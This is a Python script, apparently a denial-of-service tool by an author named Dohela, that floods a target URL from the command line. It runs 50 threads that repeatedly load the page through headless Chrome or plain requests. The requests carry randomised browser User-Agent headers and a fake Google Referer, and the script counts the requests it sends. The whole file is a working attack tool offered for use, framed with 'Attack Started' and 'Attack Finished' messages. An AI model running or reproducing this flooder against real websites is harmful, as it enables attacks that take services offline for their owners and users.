#      #########################################
       # Author : Dohela                       #
       # Site   : https://dohela.com           #
       # Date   : 5 - 3 - 2020                 #
       # Github : https://github.com/dohelax   #
       #########################################

import sys
import threading
import random
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup

# Global params
url = ''
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# Create a headless browser instance
def create_driver():
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-extensions')
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    return driver

def fetch_with_selenium(target_url):
    driver = create_driver()
    driver.get(target_url)
    page_source = driver.page_source
    driver.quit()
    return page_source

def fetch_with_requests(target_url):
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/90.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'
        ]),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': 'http://www.google.com/'
    }

    try:
        response = session.get(target_url, headers=headers)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Request error: {e}")
        return None

def httpcall(url):
    if not url.startswith('http'):
        url = 'http://' + url

    page_source = fetch_with_selenium(url)
    if not page_source:
        page_source = fetch_with_requests(url)

    if page_source:
        print(f"Fetched content from {url}")
        inc_counter()
    else:
        print(f"Failed to fetch content from {url}")

def usage():
    print('---------------------------------------------------')
    print('USAGE: python root.py <url>')
    print('You can add "safe" after url, to autoshutdown after dos')
    print('---------------------------------------------------')

# HTTP caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                httpcall(url)
                if safe == 1 and flag == 1:
                    set_flag(2)
        except Exception as ex:
            print(f"Exception in HTTPThread: {ex}")

# Monitors HTTP threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) and (previous != request_counter):
                print(f"{request_counter} Requests Sent")
                previous = request_counter
        if flag == 2:
            print("\n-- Attack Finished --")

# Execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("-- Attack Started --")
        if len(sys.argv) == 3 and sys.argv[2] == "safe":
            set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"

        for _ in range(50):  # Adjust thread count as needed
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
